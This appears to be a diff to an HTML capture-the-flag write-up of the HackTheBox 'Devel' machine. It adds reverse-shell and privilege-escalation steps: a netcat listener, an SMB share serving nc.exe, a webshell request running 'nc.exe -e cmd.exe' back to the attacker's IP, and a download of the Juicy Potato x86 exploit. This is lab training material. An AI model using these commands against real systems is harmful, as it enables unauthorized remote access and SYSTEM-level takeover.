@@ -19,7 +19,7 @@ layout: default
         <li><a href="#portscan">Port Scanning</a></li>
         <li><a href="#infogather">Information Gathering</a></li>
         <li><a href="#iis_apppool\web">Shell - iis apppool\web</a></li>
-        <li><a href="#root">Shell - root</a></li>
+        <li><a href="#root">Shell - SYSTEM</a></li>
     </ul>
 
     <h2><a id="summary">Summary</a></h2>
@@ -70,12 +70,50 @@ layout: default
 
     <img src="../images/devel/whoami.png">
 
-    <li></li>
+    <li>We have command execution.  Now we need to get a reverse shell to connect back to a netcat listener.  I set my netcat listener on 4444.  I used rlwrap before nc so that when I do get a shell I will have the ability to use my arrow keys on the command line (i.e. up/down to cycle through previous commands.  left/right to move forward and backward on current command).</li>
 
+    <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Devel]&#13;&#10;&boxur;&HorizontalLine;$ rlwrap nc -lvnp 4444                                                                                       127 &Cross;&#13;&#10;Ncat: Version 7.91 ( https://nmap.org/ncat )&#13;&#10;Ncat: Listening on :::4444&#13;&#10;Ncat: Listening on 0.0.0.0:4444&#13;&#10;    </pre>
+
+    <li>It took a while to figure out a command to get the reverse shell to work.  I finally was able to get it to work by running and smb server on my kali box and running the command from there on the victim machine.</li>
 
     <br>
-    <h2><a id="root">Shell - Root</a></h2>
+
+    <li>First I setup my smb server</li>
+    
+    <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Devel]&#13;&#10;&boxur;&HorizontalLine;$ sudo impacket-smbserver share .                                                                            130 &Cross;&#13;&#10;Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation&#13;&#10;&#13;&#10;[*] Config file parsed&#13;&#10;[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0&#13;&#10;[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0&#13;&#10;[*] Config file parsed&#13;&#10;[*] Config file parsed&#13;&#10;[*] Config file parsed&#13;&#10;    </pre>
+
+    <li>Next I put a netcat executable in this directory so I can call it from the victim machine and get my reverse shell.</li>
+
+    <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Devel]&#13;&#10;&boxur;&HorizontalLine;$ locate nc.exe                                                                 &#13;&#10;/home/kali/Documents/htb/BankRobber/nc.exe&#13;&#10;/home/kali/Documents/htb/Blackfield/exfiltrated/SMB_audit2020/forensic/tools/sysinternals/sync.exe&#13;&#10;/home/kali/Documents/htb/Jeeves/nc.exe&#13;&#10;/home/kali/Documents/htb/Querier/nc.exe&#13;&#10;/srv/SMB/nc.exe&#13;&#10;/usr/lib/mono/4.5/cert-sync.exe&#13;&#10;/usr/share/seclists/Web-Shells/FuzzDB/nc.exe&#13;&#10;/usr/share/windows-resources/binaries/nc.exe&#13;&#10;                                                                                                                     &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Devel]&#13;&#10;&boxur;&HorizontalLine;$ cp /usr/share/windows-resources/binaries/nc.exe .  &#13;&#10;    </pre>
+
+    <li>Now I send my command through the webshell.</li>
+
+    <pre>&#13;&#10;http://10.129.221.155/shell.asp?cmd=\\10.10.14.83\share\nc.exe%20-e%20cmd.exe%2010.10.14.83%204444&#13;&#10;    </pre>
+
+    <li>On my netcat listener I gain a reverse shell connection.</li>
+
+    <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Devel]&#13;&#10;&boxur;&HorizontalLine;$ rlwrap nc -lvnp 4444                                                                                       127 &Cross;&#13;&#10;Ncat: Version 7.91 ( https://nmap.org/ncat )&#13;&#10;Ncat: Listening on :::4444&#13;&#10;Ncat: Listening on 0.0.0.0:4444&#13;&#10;Ncat: Connection from 10.129.221.155.&#13;&#10;Ncat: Connection from 10.129.221.155:49158.&#13;&#10;Microsoft Windows [Version 6.1.7600]&#13;&#10;Copyright (c) 2009 Microsoft Corporation.  All rights reserved.&#13;&#10;&#13;&#10;whoami&#13;&#10;whoami&#13;&#10;iis apppool\web&#13;&#10;&#13;&#10;c:\windows\system32\inetsrv&gt;&#13;&#10;    </pre>
+
+    <br>
+    <h2><a id="root">Shell - SYSTEM</a></h2>
+
+    <li>On Windows, the web user typically has the SeImpersonatePrivilege set to enabled.  With this privilege enabled on Windows we are able to use a potatoe exploit in order to privesc to nt authority \ system.  This is also an older system and requires a 32-bit binary. We can confirm this using systeminfo.</li>
+
+    <pre>&#13;&#10;c:\windows\system32\inetsrv&gt;&#13;&#10;systeminfo&#13;&#10;systeminfo&#13;&#10;&#13;&#10;Host Name:                 DEVEL&#13;&#10;OS Name:                   Microsoft Windows 7 Enterprise &#13;&#10;OS Version:                6.1.7600 N/A Build 7600&#13;&#10;OS Manufacturer:           Microsoft Corporation&#13;&#10;OS Configuration:          Standalone Workstation&#13;&#10;OS Build Type:             Multiprocessor Free&#13;&#10;Registered Owner:          babis&#13;&#10;Registered Organization:   &#13;&#10;Product ID:                55041-051-0948536-86302&#13;&#10;Original Install Date:     17/3/2017, 4:17:31 &#65533;&#65533;&#13;&#10;System Boot Time:          14/10/2021, 12:18:25 &#65533;&#65533;&#13;&#10;System Manufacturer:       VMware, Inc.&#13;&#10;System Model:              VMware Virtual Platform&#13;&#10;<marK>System Type:               X86-based PC</marK>&#13;&#10;Processor(s):              1 Processor(s) Installed.&#13;&#10;                           [01]: x64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz&#13;&#10;BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018&#13;&#10;Windows Directory:         C:\Windows&#13;&#10;System Directory:          C:\Windows\system32&#13;&#10;Boot Device:               \Device\HarddiskVolume1&#13;&#10;System Locale:             el;Greek&#13;&#10;Input Locale:              en-us;English (United States)&#13;&#10;Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul&#13;&#10;Total Physical Memory:     3.071 MB&#13;&#10;Available Physical Memory: 2.452 MB&#13;&#10;Virtual Memory: Max Size:  6.141 MB&#13;&#10;Virtual Memory: Available: 5.538 MB&#13;&#10;Virtual Memory: In Use:    603 MB&#13;&#10;Page File Location(s):     C:\pagefile.sys&#13;&#10;Domain:                    HTB&#13;&#10;Logon Server:              N/A&#13;&#10;Hotfix(s):                 N/A&#13;&#10;Network Card(s):           1 NIC(s) Installed.&#13;&#10;                           [01]: vmxnet3 Ethernet Adapter&#13;&#10;                                 Connection Name: Local Area Connection 4&#13;&#10;                                 DHCP Enabled:    Yes&#13;&#10;                                 DHCP Server:     10.129.0.1&#13;&#10;                                 IP address(es)&#13;&#10;                                 [01]: 10.129.221.155&#13;&#10;                                 [02]: fe80::dd64:3cd6:309e:1466&#13;&#10;    </pre>
+
+    <li>I googled for "32 bit juicy potato" and came accross the link https://github.com/ivanitlearning/Juicy-Potato-x86/releases.  I download the execuable to my kali machine inside the directory of the smb share.</li>
+
+    <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Devel]&#13;&#10;&boxur;&HorizontalLine;$ wget https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe&#13;&#10;                (Removed Lines)&#13;&#10;HTTP request sent, awaiting response... 200 OK&#13;&#10;Length: 263680 (258K) [application/octet-stream]&#13;&#10;Saving to: &OpenCurlyQuote;Juicy.Potato.x86.exe&rsquor;&#13;&#10;&#13;&#10;Juicy.Potato.x86.exe          100%[==============================================&gt;] 257.50K  --.-KB/s    in 0.07s   &#13;&#10;&#13;&#10;2021-10-13 17:55:18 (3.43 MB/s) - &OpenCurlyQuote;Juicy.Potato.x86.exe&rsquor; saved [263680/263680]&#13;&#10;    </pre>
+
+    <li>Then I rename it jp.exe for easy typing.</li>
+
+    <pre>&#13;&#10;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Devel]&#13;&#10;&boxur;&HorizontalLine;$ mv Juicy.Potato.x86.exe jp.exe&#13;&#10;    </pre>
+
+    <li>Now I run the juicy potato exploit</li>
+
+    <img src="../images/devel/jp1.png">
 
 </body>
+
 </html>
 
